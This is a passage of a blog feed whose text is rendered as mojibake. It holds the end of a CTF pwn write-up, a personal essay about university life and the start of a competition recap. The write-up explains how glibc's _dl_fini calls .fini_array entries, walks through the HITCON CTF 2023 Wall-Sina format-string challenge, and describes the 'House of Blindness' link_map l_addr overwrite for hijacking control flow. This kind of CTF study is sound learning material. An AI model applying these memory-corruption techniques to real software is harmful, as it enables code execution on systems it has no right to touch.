id="ÁâπÊÄß"><a href="#ÁâπÊÄß" class="headerlink" title="ÁâπÊÄß"></a>ÁâπÊÄß</h2><p>ËØ•ÂáΩÊï∞Âú®ld.so‰∏≠ÔºåÂú®exitÊó∂Ë∞ÉÁî®ÔºåÂπ∂ÂØπ<code>.fini</code>Âíå<code>.fini_array</code>‰∏≠ÂáΩÊï∞ËøõË°åË∞ÉÁî®„ÄÇ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Is there a destructor function? */</span></span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">|| (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">  &#123;</span><br><span class="line"><span class="comment">/* When debugging print a message first. */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">&amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line"> DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">ns);</span><br><span class="line"><span class="comment">/* First see whether an array is given. */</span></span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">  (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">/ <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line"><span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* Next try the old-style destructor. */</span></span><br><span class="line"><span class="keyword">if</span> (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">DL_CALL_DT_FINI</span><br><span class="line">(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÂØπ<code>.fini_array</code>ÁöÑÂÆö‰ΩçÊòØÈÄöËøá<code>l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>ÂÆûÁé∞ÁöÑÔºåËøôÂ∞±Áªô‰∫ÜÊàë‰ª¨Êìç‰ΩúÁöÑÁ©∫Èó¥</p><h2 id="HitconCTF2023-Wall-Sina"><a href="#HitconCTF2023-Wall-Sina" class="headerlink" title="HitconCTF2023 Wall-Sina"></a>HitconCTF2023 Wall-Sina</h2><p>Ê∫êÁ†ÅÂ¶Ç‰∏ã:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buff[<span class="number">0x48</span>];</span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> gift = main;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    read(STDIN_FILENO, buff, <span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>‰øùÊä§ÂÖ®ÂºÄ<br>Ê†à‰∏äÊÆãÁïô‰∫ÜÊåáÈíà<code>_rtld_global</code>Âíå<code>_rtld_global._dl_ns[0]._ns_loaded</code>ÔºåËØª<code>rtld_global</code>ÁªìÊûÑ‰ΩìÊ∫êÁ†ÅÂèØÁü•Ôºå<code>_ns_loaded</code>ÊòØÁªìÊûÑ‰Ωì<code>link_map</code>ÁöÑÊåáÈíà<br>ÊïÖÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáfmt‰ªªÊÑèÂÜôÂú®<code>link_map</code>ÁöÑÁ¨¨‰∏ÄÈ°πÔºå‰πüÂ∞±ÊòØ<code>l_addr</code>Â§ÑÂÜô‰ªªÊÑèÂú∞ÂùÄ„ÄÇ<br>È¢òÁõÆÂú®<code>.data.rel</code>‰øùÁïô‰∫Ü‰∏Ä‰∏™mainÁöÑÊåáÈíàÔºå‰∏îÂú®<code>.fini_array</code>Âêé‰∏çËøúÂ§ÑÔºåÊïÖÊàë‰ª¨ÂèØ‰ª•ÊîπÂÜô<code>l_addr</code>ÁöÑLSBÔºå‰Ωø<code>l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>ÊåáÂêëËØ•ÊåáÈíàÔºåËææÊàêÁ¨¨‰∫åÊ¨°fmt„ÄÇÂú®Ê≥ÑÈú≤ÂêÑÂú∞ÂùÄ‰πãÂêéËøòËÉΩÂÜçËØ•<code>l_addr</code>‰Ωø<code>.fini</code>ÂÆö‰ΩçÂà∞mainËææÊàêÁ¨¨‰∏âÊ¨°fmt„ÄÇ</p><h2 id="House-of-Blindness"><a href="#House-of-Blindness" class="headerlink" title="House of Blindness"></a>House of Blindness</h2><p>ËØ•ÊâãÊ≥ïÊó†ÈúÄÊ≥ÑÈú≤Âú∞ÂùÄÔºåÈúÄË¶ÅmmapÁõ∏ÂÖ≥ÁöÑ‰ªªÊÑèÂÜô</p><p>‰æùÊóßÊòØÊîπÂÜô<code>l_addr</code>ÁöÑLSBÔºå‰Ωø<code>l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr</code>ÊåáÂêëÁõÆÊ†áÂáΩÊï∞„ÄÇÁÑ∂ËÄå<code>.dynamic</code>ÂæàÂ§ßÔºåË∂ÖËøá‰∫Ü256bytesÔºåËøôÊÑèÂë≥ÁùÄÂèØËÉΩÈúÄË¶ÅÁàÜÁ†¥‰∏Ä‰∏™byte„ÄÇ</p><p>ËØ•ÊâãÊ≥ïÁªôÂá∫‰∫Ü‰∏çÁî®ÁàÜÁ†¥ÁöÑËß£ÂÜ≥ÊñπÊ°à„ÄÇ‰ΩøÁî®<code>.dynamic</code>ÊÆµ‰∏≠ÁöÑ<code>DT_DEBUG</code>È°π„ÄÇËØ•È°πÊåáÂêë‰∫Ü‰∏Ä‰∏™‰Ωç‰∫éld.so‰∏≠ÁöÑ<code>_r_debug</code>ÁªìÊûÑÔºå‰∏îÊúâÂèØÂÜôÊùÉÈôêÔºåÂèØ‰ª•ÈÄöËøáË¶ÜÁõñLSBËææÊàêÂØπlibcÂáΩÊï∞ÁöÑË∞ÉÁî®„ÄÇ<br>Áî±‰∫éld.soÂú∞ÂùÄÂú®libc.so‰πãÂêéÔºåÂú∞ÂùÄÊòæÁÑ∂Êõ¥Â§ßÔºåÂèØ‰ª•Â∞Ü<code>l_addr</code>Êîπ‰∏∫Ë¥üÊï∞(Ë°•Á†ÅÂΩ¢Âºè)Êù•Ëß£ÂÜ≥„ÄÇ<br>Âè¶Â§ñÔºåÊ≠§Êó∂ÁöÑrdiÊ≠£Â•ΩËêΩÂú®<code>dl_load_lock</code>‰∏äÔºå‰Ωç‰∫éld.so‰∏≠Ôºå‰πüÊòØÂèØÊéßÁöÑ„ÄÇ</p><hr><p>ÂèÇËÄÉËµÑÊñô:</p><ul><li><a href="https://bbs.kanxue.com/thread-253833.htm#msg_header_h2_2">[ÁúãÈõ™]dl_runtime_resolveÁªìÂêàÊ∫êÁ†ÅÂàÜÊûêÂèäÂ∏∏ËßÅÁöÑÂá†ÁßçÊîªÂáªÊâãÊ≥ï</a></li><li><a href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/6.1.3_pwn_xdctf2015_pwn200.md">CTF-All-In-One</a></li><li><a href="https://zhuanlan.zhihu.com/p/657009223">[Áü•‰πé]HitconCTF2023 pwn Wall-Sina wp</a></li><li><a href="https://hackmd.io/jmE0VvcTQaaJm6SEWiqUJA#refining-our-exploit-with-_r_debug">[Hackmd]house of blindness</a></li><li>„ÄäÁ®ãÂ∫èÂëòÁöÑËá™Êàë‰øÆÂÖª„Äã</li></ul>]]></content>
    
    
    <summary type="html">Â∞èpwnÊâã‰∏çÂæó‰∏çÂìÅÁöÑdlÈ≠îÊ≥ï</summary>
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2023 Âú®ÈÄÉÁ¶ª‰πãÂêé</title>
    <link href="http://deepunk.icu/2023%EF%BC%9A%E5%9C%A8%E9%80%83%E7%A6%BB%E4%B9%8B%E5%90%8E/"/>
    <id>http://deepunk.icu/2023%EF%BC%9A%E5%9C%A8%E9%80%83%E7%A6%BB%E4%B9%8B%E5%90%8E/</id>
    <published>2024-02-07T15:06:50.000Z</published>
    <updated>2024-02-07T15:11:58.469Z</updated>
    
    <content type="html"><![CDATA[<p>ÁÜ¨Ëøá‰∫ÜËâ∞ÈöæÁöÑÊúüÊú´ÔºåÁªà‰∫éÊúâÁÇπÁ≤æÂäõÂÜô‰∫õÊÉ≥Ë°®ËææÁöÑ‰∏úË•ø„ÄÇËøôÁßçÊÑüËßâ‰∏ÄÂ¶ÇÈ´òËÄÉÂÆåÁöÑÈÇ£‰∏™ÊöëÂÅáÈáåÔºåÂú®Ëø∑Ëå´‰∏≠ÂÜôÂÜôÂàíÂàíÔºå‰ºÅÂõæÂú®ÊñáÂ≠ó‰∏≠ÊâæÂà∞‰∏ÄÁßçÂäõÈáèÊÑü„ÄÇ‰πãÂêéÁöÑ‰∏ÄÂπ¥ÔºåËøáÂæóÂÉè‰∏≠Â≠¶Â¢ô‰∏äÁöÑÊ®°ËåÉËÆÆËÆ∫ÊñáÔºåÂ°´Êª°‰∫ÜÂ≠óÔºåËØª‰∏çÂá∫ÊÑèÊÄù„ÄÇÂç≥‰ΩøÂú®‰∫∫ÁîüËµ∞È©¨ÁÅØÈáåÔºå‰πüÊòØË¢´‚Äùa few years later‚Äù‰∏ÄÁ¨îÂ∏¶ËøáÁöÑÊ∞¥Âπ≥„ÄÇÂΩìÁÑ∂ÔºåÂ•ΩÁöÑÊïÖ‰∫ãÊÄªË¶ÅÂ≠¶‰ºöÂú®‰∏çËØ•Á≤æÂΩ©ÁöÑÂú∞Êñπ‰∏çÁ≤æÂΩ©„ÄÇÊ≠£Â•ΩÂâçÂπ¥ÁöÑÊïÖ‰∫ã‰πüÂøòËÆ≤‰∫ÜÔºåÈÇ£Â∞±‰ªéÂ§¥ËÆ≤Ëµ∑Âêß„ÄÇ</p><p>È´òËÄÉÂÆåÁöÑÊó•Â≠êÔºå‰∏ÄÊã®‰∫∫ÂøôÁùÄÁºÖÊÄÄÔºå‰∏ÄÊã®‰∫∫ÂøôÁùÄÈÄÉÁ¶ª„ÄÇÊàëÁêÜÂ∫î‰πüÂøôÁùÄÈÄÉÁ¶ª„ÄÇ‰ΩÜÂøç‰∏ç‰ΩèÁªôÂñúÊ¨¢ÁöÑÂ•≥ÁîüÂèë‰∫ÜÊù°Ê∂àÊÅØÔºåÈ°∫ÁêÜÊàêÁ´†Âú∞ÔºåËÆ©Êú¨Â∞±‰∏çÂ§™‰∏ÄÂ∏ÜÈ£éÈ°∫ÁöÑÈÄÉÁ¶ª‰πãÊóÖÈõ™‰∏äÂä†Èúú„ÄÇÂú®ÂæóÊâã‰πãÂâçÔºåÂú®ÈÄÉÁ¶ª‰πãÂêéÔºåÊàëÂú®ÂçÅÂÖ´Â≤ÅÁîüÊó•ÈÇ£Â§©‰∏ÄÈÅçÈÅçÊ¢≥ÁêÜÁùÄËá™Â∑±Êó¢‰∏çÂ≤ÅÊúàÈùôÂ•Ω‰πü‰∏çÊ≥¢ÊæúÂ£ÆÈòîÁöÑÂâçÂçäÁîü„ÄÇ‰∫∫ÊÄªÊòØÂú®Êó•Â§ç‰∏ÄÊó•ÈáåÊ∏¥ÊúõÈÅáËßÅÊîπÂèòÔºåÁõ¥Âà∞ÊÑèËØÜÂà∞ÊîπÂèòÊ∞∏Ëøú‰∏ç‰ºöÂ•î‰ªñËÄåÊù•ÔºåËøôÊó∂ÂÄôÁöÑ‰ªñÔºåÊµëÁÑ∂‰∏çËßâÂ∑≤ÁªèÂú®Á≠âÂæÖÁùÄ‰∏ÄÂ£∞Âèë‰ª§‚Äî‚Äî‰∏Ä‰∏™ÊÑè‰πâÈùûÂá°ÁöÑÊó•Â≠ê„ÄÅ‰∏ÄÂè•ËØù„ÄÅ‰∏Ä‰∏™‰∫∫„ÄÇÈÇ£Â§©ÊàëÁúüÊ≠£ÂÜ≥ÂÆöË¶ÅÈÄÉÁ¶ªÔºåÊàëÁü•ÈÅìÊàëÁöÑ‰∏ÄÈÉ®ÂàÜËøòÂõ∞Âú®ÈÇ£Èáå„ÄÇÂÆÉ‰∏çÂú®Â≠¶Ê†°ÈáåÈù¢ÔºåËÄåÂú®Ê≤øÁùÄÂú∞Âü∫ÂæÄ‰∏ã‰∫îÂçÉ‰∏áÂÖ¨ÈáåÊ∑±Â§Ñ„ÄÇÈÇ£ÈáåÊúâ‰∏ÄÊù°Ê†πÔºåË¥ØÁ©øÊàëÂèóÊïôËÇ≤ÁöÑÂâçÂçäÁîüÔºåËîìÂª∂ÔºåÁîüÈïøÔºåÂú®ÁîüÂëΩÁöÑÁªàÁÇπÊúùÊàëÊå•Êâã„ÄÇ</p><p>ÊàëÂèàÊÉ≥Âà∞Â§ß‰∏Ä„ÄÇÂ§ß‰∏ÄÁöÑÂÖ≥ÈîÆËØçÊòØ‚ÄúÊÇ¨ÊµÆ‚Äù„ÄÇÈÇ£ÊòØ‰ªÄ‰πàÊÑüËßâÔºåÂ∞±ÂÉè‰∏ÄÈòµÈ£éÊâòËµ∑Ôºå‰Ω†ÂíåÂë®ÈÅ≠‰∏ñÁïåÂ∞±ÊµÆÂà∞‰∫ÜÂçäÁ©∫‰∏≠„ÄÇ‰Ω†ÁöÑÂäõÈáèÔºåÂú®Ëøô‰∏™Ê≤°ÊúâÊîØÁÇπÁöÑÁ©∫‰∏≠ËΩªÈ£òÈ£òÁöÑÔºåÁ®ç‰∏çÊ≥®ÊÑèËøò‰ºöÂ§±ÂéªÂπ≥Ë°°„ÄÇ‰∫éÊòØ‰Ω†ÂíåÂë®Âõ¥ÁöÑ‰∫∫‰∏ÄËµ∑È£òÂïäÈ£ò„ÄÇÊ∑∑Ê≤åËøêÂä®ÈáåÊ≤°Êúâ‰∫∫Áü•ÈÅìÁõÆÁöÑÂú∞„ÄÇ</p><p>Âú®Ëøô‰∏™ËØªÁ†îÂá†‰πéÊàê‰∏∫ÂîØ‰∏ÄÂá∫Ë∑ØÁöÑ‰∏ì‰∏öÔºåËøΩÊ±ÇÊûÅËá¥ÁöÑÂàÜÊï∞ÊòØÁîüÂ≠òÁöÑÊú¨ËÉΩ„ÄÇÊàëÁúãÂà∞‰∏Ä‰∫õ‰ºòÁßÄÁöÑÂêåÂ≠¶‰∏∫‰∫ÜËÄÉËØïÂ•âÁåÆ‰∫ÜËá™Â∑±Â§ßÈÉ®ÂàÜÊó∂Èó¥ÔºåÁÑ∂ÂêéÂÖ¨ÂºÄÊàñÁßÅ‰∏ãÁî®‚ÄúÂç∑‚ÄùËØÑ‰ª∑ÁùÄÂÖ∂‰ªñÂä™ÂäõÁöÑÂêåÂ≠¶ÔºåËΩ¨Â§¥ÂèàÂú®Êüê‰∫õ‰∫§ÊµÅÁæ§Èáå‰ª•‚ÄúXÁ•û‚Äù‚ÄúX‰Ω¨‚Äù‰∫íÁõ∏ÂêπÊçß„ÄÇÊàëÊó†ÊÑèÊåáË∞™ÔºåÈÄâÊã©ËøôÁßçÊ¥ªÊ≥ïÁöÑÊòØÁéØÂ¢ÉÔºåËÄåÈùû‰ªñ‰ª¨„ÄÇ‰ΩÜ‰ªéÂ∞èÂà∞Â§ßÁúãÂêåÊ†∑ÁöÑÂâßÊú¨Â§öÂ∞ë‰ºöÂÆ°ÁæéÁñ≤Âä≥Ôºå‰ΩïÂÜµÂèõÈÄÜÂ¶ÇÊàë„ÄÇ‰∫éÊòØÊàëÂºÄÂßãÁøòËØæÔºåËµ∑ÂàùÂè™ÁøòCËØ≠Ë®Ä‰∏ÄÁ±ªÁöÑÊ∞¥ËØæÔºåÁÑ∂ÂêéÂºÄÂßãÈó¥Ê≠áÁøòÂæÆÁßØÂàÜ‰∏ÄÁ±ªÁöÑÊ≠£ËØæÔºåÁõ¥Âà∞ÂèëÁé∞ËøõÂ∫¶Ë∑ü‰∏ç‰∏äÔºåÁ¥¢ÊÄß‰∏ÄËäÇÈÉΩ‰∏çÂéª‰∫Ü„ÄÇÂ•ΩÂú®ËÄÉÂâçÂäõÊåΩÁãÇÊæúÔºåÊúÄÂêéÊùÇÊäÄËà¨ÂÆâÁ®≥Âú∞ËêΩÂú®‰øùÁ†îÁ∫øÈáå„ÄÇ</p><p>ÁøòÂá∫Êù•ÁöÑÊó∂Èó¥‰πüÊú™ÂøÖÂπ≤‰∫Ü‰ªÄ‰πàÊ≠£‰∫ãÔºåÈô§‰∫ÜÁù°ËßâÔºåÈ°∫Âà©ÂÆåÊàêÁöÑÂè™ËÆ∞ÂæóÈÄöËøáÂáùËÅöÊãõÊñ∞„ÄÇÂâ©‰∏ãÁöÑÈÉΩÊòØ‰∫õËçíÂîêÁöÑÂ§±Ë¥•ÔºöÊåëÊàò‰∏Ä‰∫∫ÂÆåÊàêÁîµËµõÈ¢òÁõÆÔºàÁÑ∂ÂêéÂú®Êà™Á®øÂâçÂèëÁé∞pcbÂ∞ÅË£ÖÁîªÂèçÔºâ„ÄÅÊåëÊàòÂêå‰∏ÄÂ§©ÊâìÊ†°ÂÜÖacmÂíåÂè∞ÁêÉÊ†°Ëµõ„ÄÅÊåëÊàòËØªÂÆåÂõæ‰π¶È¶ÜÈáåÂêÑÁßçÁ®ÄÂ•áÂè§ÊÄ™ÁöÑÈ¢ÜÂüüÁöÑ‰ª£Ë°®‰ΩúÂìÅ„ÄÇ‰∏çÂ∏¶Êù•Êî∂Ëé∑ÁöÑÂ§±Ë¥•ÔºåÁîöËá≥Êúâ‰∫õ‰πèÂë≥„ÄÇ‰πèÂë≥ÂΩìÁÑ∂ÊòØÁõ∏ÂØπÁöÑÔºå‰∏ÄÁõ¥Ëæì‰πüÊØî‰∏ç‰∏äÂú∫Â•Ω„ÄÇ</p><p>ÂêéÈù¢Â∞±ÊòØ‰ª•ÂâçÊèêËøáÁöÑËÄÅÂâßÊÉÖÔºåËßÇÊë©ASCÔºåÂèÇÂä†ÂõΩËµõÔºåÈáçÊñ∞ËûçÂÖ•ÂáùËÅöbalabala„ÄÇÊúÄÈáçË¶ÅÁöÑÔºåÂ§ßÊ¶ÇÊòØÊâæÂà∞‰∫ÜÁÉ≠Áà±ÁöÑÊñπÂêëÂíå‰∏ÄÁæ§ÂøóÂêåÈÅìÂêàÁöÑ‰∫∫„ÄÇ</p><p>ËøôÊòØÊ≠£Èù¢ÁöÑÂΩ±ÂìçÔºå‰ªéË¥üÈù¢Êù•ËØ¥Ôºå‰∏Ä‰∏™ÊòéÁ°ÆÁöÑÊñπÂêëÔºåËÆ©ÊàëÂØπËØæÂÜÖÊõ¥‰∏ç‰∏äÂøÉ‰∫Ü„ÄÇÊçÆÁªüËÆ°ÔºåÊàë23‰∏ãÂçäÂπ¥‰∏≠ÂêéÊúü‰∏ÄÂë®Âπ≥ÂùáÂè™‰∏ä‰∫Ü2.5ËäÇËØæÔºåÂèàÂ∑≤Áü•ÊàëÂú®Â§ç‰π†ÊúüÈó¥Áõ∏ÂΩìÊµÆË∫ÅÔºà‰∏îÊ≤âËø∑R6ÔºâÔºåÊòìÂæóÔºöÊàëÁöÑÁª©ÁÇπÂ∞ÜÊÉ®‰∏çÂøçÁùπ„ÄÇÔºàÊú¨ÊñáÂä®Á¨îÊó∂ÔºåÊàë‰∏ÄÂ∫¶Áõ∏‰ø°ÂçäÂØº‰ΩìÁâ©ÁêÜÂ∞ÜËøéÊù•ÊàëÁöÑÁ¨¨‰∏ÄÈó®ÊåÇÁßë„ÄÇÁî±‰∫éÊú¨ÊñáË∑®Ë∂ä‰∏Ä‰∏™Â§öÊúàÊâçÂÆåÊàêÔºåÂÜôÂà∞Êú¨ÊÆµÊó∂ÊàêÁª©Êó©Â∞±Âá∫‰∫ÜÔºåÊàëÁé∞Âú®Áü•ÈÅìÊàëË¢´Êçû‰∫ÜÔºåÊúâÈÅìÊòØÔºöÂ§©Êó†Áªù‰∫∫‰πãË∑ØÔºâËøôÁßçÊàêÁª©Âü∫Êú¨ÂÆ£ÂëäÂíå‰øùÁ†îÊó†Áºò‰∫Ü„ÄÇ</p><p>Ëøô‰∏™ÁªìÊûúÂπ∂Ê≤°ÊúâÂºïËµ∑ÊàëÂ§öÂ∞ëËß¶Âä®ÔºåÂ•ΩÂÉèÊó©Â∞±Áü•ÈÅì‰ºöËµ∞Âà∞Ëøô‰∏ÄÊ≠•„ÄÇÊàëÊÉ≥ÔºåÂç≥‰ΩøËÆ©Êó∂Èó¥ÂÄíÊµÅ‰∏§‰∏™ÊúàÔºåÊèêÂâçÂºÄÂßãÂ§ç‰π†ÔºåÊàë‰æùÊóß‰ºöÂú®ËÉΩÊÑüÁü•Âà∞Âç±Èô©ÁöÑÈÇ£‰∏™ËäÇÁÇπ‰πãÂâçÊå•ÈúçÊó∂Èó¥ÔºåÊúÄÂêé‰æùÊóßÊòØÂãâÂãâÂº∫Âº∫Â§ç‰π†‰∏™Â§ßÊ¶ÇÁöÑÁªìÊûú„ÄÇÂ¶ÇÊûúÊàëÂáèÂ∞ëÁøòËØæÊ¨°Êï∞ÔºåÊàë‰ºöÂõ†‰∏∫Â¢ûÊ∑ªÁöÑ‰ø°ÂøÉÔºåÁªßÁª≠Âª∂ÂêéÈÇ£‰∏™ËÆ§ÁúüÂ§ç‰π†ÁöÑËäÇÁÇπÔºåÊúÄÂêéÁöÑÁªìÊûú‰πü‰∏ç‰ºöÊîπÂèòÂ§öÂ∞ë„ÄÇÊç¢Âè•ËØùËØ¥ÔºåÂ§ç‰π†Êó∂Èó¥„ÄÅÁøòËØæÔºåËøô‰∫õÂèòÈáèÂ¶Ç‰ΩïÊîπÂèòÔºå‰πüÊó†Ê≥ïÊîπÂèòÂÖ∂ÁªìÊûú„ÄÇËÄÉËØïÁöÑÁªìÂ±ÄÔºåÂú®Â§±Ë¥•ËøôÈáåÊî∂Êïõ‰∫Ü„ÄÇËøô‰∏çÊòØÊîπÂ§¥Êç¢Èù¢ÁöÑÂÆøÂëΩËÆ∫ÔºåÊàëÂØπÂæÖÂ≠¶ÁßëÁöÑÁÉ≠ÊÉÖÔºåÂßãÁªàÊéßÂà∂ÁùÄÊî∂ÊïõÁöÑÊñπÂêë„ÄÇÂè™Ë¶Å‰∏çÂØπÂÖ≥ÈîÆÂèòÈáèÂÅöÂá∫ÊîπÂèòÔºåÂÜçÂ§öÁöÑÂ∞ùËØïÂíåÊÇîÊÅ®‰πüÊ≤°ÊúâÊÑè‰πâ„ÄÇ‰∏ÄÂàáÈÉΩÊòØÊàëÂ∫îÂæóÁöÑÔºåËøôÊ†∑ÁöÑËßÇÁÇπËÆ©ÊàëËΩªÊòìÂ∞±Êé•Âèó‰∫ÜÁé∞ÂÆû„ÄÇ</p><p>Ëøô‰πüÁÆóÈÄÉÁ¶ªÂêóÔºü‰ªéË°å‰∏∫‰∏äÊõ¥ÂÉèË¢´È©±ÈÄêÔºåÁúãÂéüÂõ†Âç¥ÂÉèÊó©ÊúâÈ¢ÑË∞ã„ÄÇ‰ªé‰∏ÄÊù°ÊòéÁ°ÆÁöÑËµõÈÅìÔºåËµ∞ÂêëÊú™Áü•ÁöÑÊó∑Èáé„ÄÇÂ•ΩÂ§ÑÊòØ‰∏çÁî®ÂÜç‰ªòÂá∫Áª¥ÊåÅÈÄâÊã©ÊùÉÁöÑÊàêÊú¨ÔºåËøôÂ§ßÊ¶ÇÊòØ‰∏ÄÁßçËá™Áî±ÔºåÂèØÊòØËá™Áî±Â∞ÜËêΩÂêë‰ΩïÂ§ÑÔºåÊàë‰∏çÁü•ÈÅì„ÄÇÂ¶ÇÊûúÊòéÂ§©ÁöÑÂÆâÂÖ®ÊÑü‰∏çËÉΩÊâò‰ªòÊüê‰∏™Âà∂Â∫¶„ÄÅÊüê‰∏™ÁªÑÁªáÔºåÈÇ£ÊàëÈÄâÊã©‰∫§ÁªôÊòéÂ§©ÁöÑËá™Â∑±„ÄÇ</p><p>ÈÇ£Âπ¥È´ò‰∏âÔºåÁ©∫Ê∞îÈò¥ÂÜ∑ÔºåËá™‰π†ËØæÔºåÁè≠‰∏ª‰ªªÊù•Âà∞Ë∑üÂâçÔºåÊàëËøòÊ≤âÊµ∏Âú®Âç°ÊãâÈ©¨‰ΩêÂ§´ÂÖÑÂºüÁöÑ‰∏ñÁïåÊµëÁÑ∂‰∏çËßâ„ÄÇÊàëÁõ∏‰ø°ÈÇ£‰∏ÄÂàªÊàëÂ∑≤ÁªèÈÄÉÁ¶ª‰∫ÜÔºåÈÄèËøáÂ±ÇÂ±Ç‰π¶Âç∑ÂíåÂ§©Ëä±ÊùøÔºå‰∫´ÂèóÁü≠ÊöÇÁöÑÁ••Âíå„ÄÇÊ≠§ÂêéÁöÑ‰∫∫ÁîüÔºåÊàëÂøÖÈ°ª‰∏çÂÅúÈÄÉ‰∏ãÂéªÔºåÊâçËÉΩË∫≤ËøáË∫´ÂêéÁöÑÂ¥©Âùè„ÄÇ</p>]]></content>
    
    
    <summary type="html">ÊîØÁ¶ªÁ†¥Á¢éÁöÑÊïÖ‰∫ãÔºåÊó†ÁóÖÂëªÂêüÁöÑÊÑüÊÖ®</summary>
    
    
    
    <category term="misc" scheme="http://deepunk.icu/categories/misc/"/>
    
    
    <category term="Êë∏" scheme="http://deepunk.icu/tags/%E6%91%B8/"/>
    
  </entry>
  
  <entry>
    <title>Âº∫ÁΩëÊãüÊÄÅÂºÇÈóªÂΩï</title>
    <link href="http://deepunk.icu/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%BC%82%E9%97%BB%E5%BD%95/"/>
    <id>http://deepunk.icu/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%BC%82%E9%97%BB%E5%BD%95/</id>
    <published>2023-12-09T08:35:50.000Z</published>
    <updated>2023-12-09T14:13:23.580Z</updated>
    
    <content type="html"><![CDATA[<p>Âæà‰πÖÊ≤°ÊâìËøáËøô‰πà‰πÖÁöÑÁ∫ø‰∏ã‰∫Ü„ÄÇ</p><p>Âú®Âçó‰∫¨ÔºåÊåÅÁª≠72Â∞èÊó∂ÔºåÂíå‰∏ñÁïåÂêÑÂú∞ÁöÑÂº∫ÂäõÊàòÈòüÂêåÂè∞Á´ûÊäÄ„ÄÇ‰∏çÂæó‰∏çËØ¥ÔºåÂê¨Ëµ∑Êù•Êå∫ÈÖ∑„ÄÇ</p><h1 id="ÊàëÂú®Âçó‰∫¨ÈÅáÂà∞Âõ∞ÈöæÁù°Â§ßËßâ"><a href="#ÊàëÂú®Âçó‰∫¨ÈÅáÂà∞Âõ∞ÈöæÁù°Â§ßËßâ" class="headerlink" title="ÊàëÂú®Âçó‰∫¨ÈÅáÂà∞Âõ∞ÈöæÁù°Â§ßËßâ"></a>ÊàëÂú®Âçó‰∫¨ÈÅáÂà∞Âõ∞ÈöæÁù°Â§ßËßâ</h1><p>‰πãÂâç‰ªéÊù•Ê≤°ÊúâÊé•Ëß¶Ëøáiot„ÄÅiov‰∏ÄÁ±ªÁöÑ‰∏úË•øÔºå‰∫éÊòØÊàëÂú®ÊØîËµõÂâç‰∏ÄÂë®ÂºÄÂßãÈõ∂Èõ∂Êï£Êï£Âú∞Â≠¶„ÄÇÊúÄÂêéÊÑüËßâÊúâ‰∫Ü‰∏ÄÁÇπÂõ∫‰ª∂ÂàÜÊûêÂíåÊó•Ë∑ØÁî±Âô®ÁöÑÂü∫Á°Ä; 